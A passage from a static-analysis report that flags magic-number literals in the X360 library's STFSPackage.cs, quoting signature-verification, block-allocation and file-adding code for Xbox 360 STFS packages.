xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  				xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  				xPK.Close ();  			}  		}  		break;  	}  	xIO.Position = xSigSpot;  	byte[] xSiggy = ScrambleMethods.StockScramble (xIO.ReadBytes (xRSAKeyz.Modulus.Length)' true);  	xIO.Position = 0x22C;  	byte[] xHeadr = xIO.ReadBytes (0x118);  	return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot);  }  catch {  	throw CryptoExcepts.CryptoVeri;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xRSAKeyz.Exponent = xIO.ReadBytes (4);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xSigSpot = 4;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: if (!xDev) {  	xRSAKeyz.Exponent = new byte[] {  		0'  		1'  		0'  		1  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  }  else {  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  	xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  	xLK.Close ();  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xRSAKeyz.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xSigSpot = 4;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: if (!xDev) {  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  }  else {  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  	xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  	xPK.Close ();  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: if (!xDev) {  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  }  else {  	xRSAKeyz.Exponent = new byte[] {  		0'  		0'  		0'  		3  	};  	DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  	xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  	xPK.Close ();  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xRSAKeyz.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: xRSAKeyz.Exponent = new byte[] {  	0'  	0'  	0'  	3  };  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteHeader,The following statement contains a magic number: x.Position = 4;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAddFile,The following statement contains a magic number: try {  	if (xIOIn == null || !xIOIn.Accessed || xIOIn.Length > ((xSTFSStruct.SpaceBetween [2] - 1) << 0xC))  		return (xActive = false);  	foreach (FileEntry m in xFileDirectory) {  		if (m.FolderPointer == Folder && m.Name == xFileName)  			return (xActive = false);  	}  	// Allocates blocks  	AddToLog ("Allocating blocks");  	BlockRecord[] xEntAlloc = xAllocateBlocks (xNewEntBlckCnt (1)' 0);  	BlockRecord[] xFileAlloc = xAllocateBlocks (xIOIn.BlockCountSTFS ()' xEntAlloc [xEntAlloc.Length - 1].ThisBlock + 1);  	// Adds new file info  	AddToLog ("Adding file information");  	ItemEntry x = new ItemEntry (xFileName' (int)xIOIn.Length' false' (ushort)(xFileDirectory.Count + xFolderDirectory.Count)' Folder' this);  	FileEntry y = new FileEntry (x);  	y.xStartBlock = xFileAlloc [0].ThisBlock;  	xFileDirectory.Add (y);  	return xDoAdd (ref xIOIn' ref xEntAlloc' ref xFileAlloc);  }  catch (Exception x) {  	return (xActive = false);  	/*throw x;*/}  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAddFile,The following statement contains a magic number: if (xIOIn == null || !xIOIn.Accessed || xIOIn.Length > ((xSTFSStruct.SpaceBetween [2] - 1) << 0xC))  	return (xActive = false);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,dlcname,The following statement contains a magic number: try {  	xIO.Position = 0x32C;  	return xIO.ReadBytes (0x14).HexString () + ((byte)(xHeader.TitleID >> 16)).ToString ("X2");  }  catch {  	return "00000000000000000000000000000000000000000000";  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,dlcname,The following statement contains a magic number: return xIO.ReadBytes (0x14).HexString () + ((byte)(xHeader.TitleID >> 16)).ToString ("X2");  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The following statement contains a magic number: pos [2] = xSTFSStruct.GenerateHashOffset (RecIn.ThisBlock' TreeLevel.L0) + 0x14;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The following statement contains a magic number: if (canswitch)  	pos [2] += (current.Index << 0xC);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The following statement contains a magic number: pos [2] += (current.Index << 0xC);  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,SwitchNWrite,The following statement contains a magic number: xIO.Position = pos [2];  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,The following statement contains a magic number: if ((xSTFSStruct.BlockCount + count) > xSTFSStruct.SpaceBetween [2])  	return new BlockRecord[0];  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,The following statement contains a magic number: for (uint i = 0; i < count; i++) {  	BlockRecord x = null;  	while (x == null) {  		if (xStart > xSTFSStruct.SpaceBetween [2])  			break;  		// Grab record or make new one  		if (xStart < xSTFSStruct.xBlockCount) {  			BlockRecord y = GetRecord (xStart' TreeLevel.L0);  			if (y.Status == HashStatus.Old || y.Status == HashStatus.Unused)  				x = y;  		}  		else {  			if (xStart == Constants.BlockLevel [0]) {  				xIO.Position = GenerateHashOffset (0' TreeLevel.L1) + (xSTFSStruct.TopRecord.Index << 0xC) + 0x14;  				xIO.Write (xSTFSStruct.TopRecord.Flags);  				xIO.Flush ();  			}  			else if (xStart == Constants.BlockLevel [1]) {  				xIO.Position = GenerateHashOffset (0' TreeLevel.L2) + (xSTFSStruct.TopRecord.Index << 0xC) + 0x14;  				xIO.Write (xSTFSStruct.TopRecord.Flags);  				xIO.Flush ();  			}  			x = new BlockRecord (HashStatus.New' Constants.STFSEnd);  			x.ThisBlock = xStart;  			x.ThisLevel = TreeLevel.L0;  		}  		xStart++;  	}  	xReturn.Add (x);  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,The following statement contains a magic number: while (x == null) {  	if (xStart > xSTFSStruct.SpaceBetween [2])  		break;  	// Grab record or make new one  	if (xStart < xSTFSStruct.xBlockCount) {  		BlockRecord y = GetRecord (xStart' TreeLevel.L0);  		if (y.Status == HashStatus.Old || y.Status == HashStatus.Unused)  			x = y;  	}  	else {  		if (xStart == Constants.BlockLevel [0]) {  			xIO.Position = GenerateHashOffset (0' TreeLevel.L1) + (xSTFSStruct.TopRecord.Index << 0xC) + 0x14;  			xIO.Write (xSTFSStruct.TopRecord.Flags);  			xIO.Flush ();  		}  		else if (xStart == Constants.BlockLevel [1]) {  			xIO.Position = GenerateHashOffset (0' TreeLevel.L2) + (xSTFSStruct.TopRecord.Index << 0xC) + 0x14;  			xIO.Write (xSTFSStruct.TopRecord.Flags);  			xIO.Flush ();  		}  		x = new BlockRecord (HashStatus.New' Constants.STFSEnd);  		x.ThisBlock = xStart;  		x.ThisLevel = TreeLevel.L0;  	}  	xStart++;  }  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAllocateBlocks,The following statement contains a magic number: if (xStart > xSTFSStruct.SpaceBetween [2])  	break;  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The following statement contains a magic number: try {  	AddToLog ("Setting Package variables");  	new System.Threading.Thread (new System.Threading.ParameterizedThreadStart (System.DLLIdentify.PrivilegeCheck)).Start (System.Threading.Thread.CurrentThread);  	xroot = new FolderEntry (""' 0' 0xFFFF' 0xFFFF' this);  	if (xSession.HeaderData.ThisType == PackageType.ThematicSkin) {  		DJsIO x1 = new DJsIO (true);  		DJsIO x2 = new DJsIO (true);  		x1.Write ((int)xSession.ThemeSettings.StyleType);  		x1.Flush ();  		x1.Close ();  		if (!xSession.AddFile (x1.FileNameLong' "DashStyle"))  			throw STFSExcepts.ThemeError;  		x2.Write ("SphereColor=" + ((byte)xSession.ThemeSettings.Sphere).ToString ().PadRight (2' '\0'));  		x2.Write (new byte[] {  			0xD'  			0xA  		});  		x2.Write ("AvatarLightingDirectional=" + xSession.ThemeSettings.AvatarLightingDirectional0.ToString ("#0.0") + "'" + xSession.ThemeSettings.AvatarLightingDirectional1.ToString ("#0.0000") + "'" + xSession.ThemeSettings.AvatarLightingDirectional2.ToString ("#0.0") + "'0x" + xSession.ThemeSettings.AvatarLightingDirectional3.ToString ("X"));  		x2.Write (new byte[] {  			0xD'  			0xA  		});  		x2.Write ("AvatarLightingAmbient=0x" + 